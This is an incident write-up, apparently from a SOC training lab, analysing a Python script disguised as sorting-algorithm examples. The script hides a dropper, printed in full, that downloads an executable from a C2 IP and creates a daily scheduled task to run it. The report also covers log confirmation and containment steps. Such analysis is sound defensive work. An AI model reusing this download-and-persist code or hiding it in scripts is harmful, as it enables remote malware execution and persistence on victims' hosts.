# 	SOC144 - New scheduled task created

## Executive Summary 


On May 14, 2021, the Security Operations Center (SOC) detected the creation of a new scheduled task on the host **Helena** (172.16.17.36). The investigation revealed that the task was created by a Python script, `Sorted-Algorithm.py`, which was intentionally designed to appear harmless. Static analysis of the script's source code revealed a malicious payload hidden at the end of otherwise benign code. This payload downloads a secondary executable from a command-and-control (C2) server and then establishes persistence by creating a scheduled task to run the downloaded malware daily. Network and endpoint logs confirm the C2 connection and task creation were successful. This is a **True Positive** for a successful malware infection and host compromise.

## Incident Details

The initial alert was triggered by the creation of a scheduled task by a suspicious file:

<img width="1506" height="493" alt="image" src="https://github.com/user-attachments/assets/0282bf00-29e1-4e4e-b446-2dd895a6a291" />

| | |
| :--- | :--- |
| **Date of Incident**| May 14, 2021 |
| **Attacker C2 IP**| 92.27.116.104 |
| **Destination Host**| Helena (172.16.17.36) |
| **Malware File**| `Sorted-Algorithm.py` |
| **File Hash (MD5)**| 65d880c7f474720dafb84c1e93c51e11 |
| **Attack Type**| Malware Dropper with Persistence |
| **Case Link**| *([Case link](https://app.letsdefend.io/case-management/casedetail/sohankanna/91))* |

## Investigation and Analysis

### 1. Initial Triage and Deceptive Nature

The investigation began by analyzing the file `Sorted-Algorithm.py`. A check of its hash on VirusTotal showed a very low detection rate (only 1 vendor), which is common for simple, non-obfuscated script-based droppers. The filename and the majority of the code are designed to mislead a cursory analysis into believing it's a harmless educational script about sorting algorithms.

### 2. Source Code Analysis

A static analysis of the Python script revealed its true, malicious nature. The initial code, including ASCII art and basic sorting functions, serves as a smokescreen.
```py
import urllib.request
import os

print(r"""\

                                   ._ o o
                                   \_`-)|_
                                ,""       \ 
                              ,"  ## |   ಠ ಠ. 
                            ," ##   ,-\__    `.
                          ,"       /     `--._;)
                        ,"     ## /
                      ,"   ##    /


                """)
				
# vowels list
vowels = ['e', 'a', 'u', 'o', 'i']
# sort the vowels
vowels.sort()
# print vowels
print('Sorted list:', vowels)


# vowels list
vowels = ['e', 'a', 'u', 'o', 'i']
# sort the vowels
vowels.sort(reverse=True)
# print vowels
print('Sorted list (in Descending):', vowels)
	

# take second element for sort
def takeSecond(elem):
    return elem[1]
# random list
random = [(2, 2), (3, 4), (4, 1), (1, 3)]
# sort list with key
random.sort(key=takeSecond)
# print list
print('Sorted list:', random)	
					
# --- MALICIOUS PAYLOAD BEGINS ---
					
urllib.request.urlretrieve("http://92.27.116.104/", "C:/Windows/Temp/x86_x64_setup.exe")
os.system('SCHTASKS /CREATE /SC DAILY /TN "DailyRoutine" /TR "C:/Windows/Temp/x86_x64_setup.exe" /ST 11:00')
```
1.  **Stage 1: Download Payload (`urllib.request.urlretrieve`)**
    *   This command instructs Python to download a file from the hardcoded C2 server `http://92.27.116.104/`.
    *   It saves the downloaded file to a common temporary location, `C:/Windows/Temp/`, naming it `x86_x64_setup.exe` to masquerade as a legitimate setup file.

2.  **Stage 2: Establish Persistence (`os.system('SCHTASKS ...')`)**
    *   This command executes the Windows Task Scheduler utility (`schtasks.exe`).
    *   It creates a new task named "DailyRoutine."
    *   It configures the task to run every day at 11:00 AM.
    *   It sets the task's action to run the malware that was just downloaded. This ensures the malware will re-execute daily, surviving reboots and making it persistent.

### 3. Confirmation of Success via Log Analysis

The investigation confirmed that both stages of the malicious payload were executed successfully by correlating the static analysis with dynamic logs.

*   **Network Log Confirmation:** Firewall or proxy logs show that the victim host `172.16.17.36` successfully initiated an outbound connection to the C2 server `92.27.116.104`. This proves the download command was executed and the secondary payload was retrieved.
    <img width="1572" height="261" alt="image" src="https://github.com/user-attachments/assets/cc5ee4ca-17b9-4915-a2b8-51feab267650" />

*   **Endpoint Log Confirmation:** The endpoint security log shows the creation of a new scheduled task exactly as specified in the Python script's payload.
    <img width="1440" height="546" alt="image" src="https://github.com/user-attachments/assets/5e84c9c7-9b84-41a7-badd-905379dc9c88" />

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR, Network Logs, VirusTotal, Static Analysis
*   **Skills Demonstrated:** Static Malware Analysis, Log Correlation, Persistence Mechanism Analysis (Scheduled Task), C2 Traffic Identification.

## Playbook Solution: Incident Classification

*   **Analyze Malware:** **Malicious.** The script is a dropper that downloads a secondary payload and establishes persistence.
*   **Was C2 Requested?** **Yes, Accessed.** The host successfully connected and downloaded a file.
*   **Was Malware Quarantined?** **No.** Both the initial script and the downloaded executable were allowed.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC144 was a **true positive** for a successful malware infection. An attacker tricked a user into running a seemingly harmless Python script that acted as a dropper. The script downloaded a secondary malicious payload and created a daily scheduled task to ensure its persistence. The host **Helena** is compromised.

**Recommendations:**

1.  **CONTAINMENT - Isolate Host Immediately:** Disconnect the host **Helena** (172.16.17.36) from the network to prevent the persistent malware from executing and communicating with its C2 server.
2.  **ERADICATION - Remove Persistence and Malware:**
    *   Delete the scheduled task named "DailyRoutine."
    *   Delete the initial Python script (`Sorted-Algorithm.py`).
    *   Delete the downloaded malware executable (`C:/Windows/Temp/x86_x64_setup.exe`).
3.  **ESCALATE:** Escalate this incident to the Tier 2/Incident Response (IR) team for a deeper forensic investigation to identify the nature and actions of the downloaded `x86_x64_setup.exe`.
4.  **INVESTIGATION:** The IR team must analyze the secondary payload and review all activity on the host since the time of infection to check for lateral movement, credential theft, or data exfiltration.
5.  **BLOCK INDICATORS:** Block the C2 IP address `92.27.116.104` at the network firewall. Add the hash of the Python script (`65d880c7f474720dafb84c1e93c51e11`) and the downloaded executable (once its hash is known) to the EDR blocklist.





















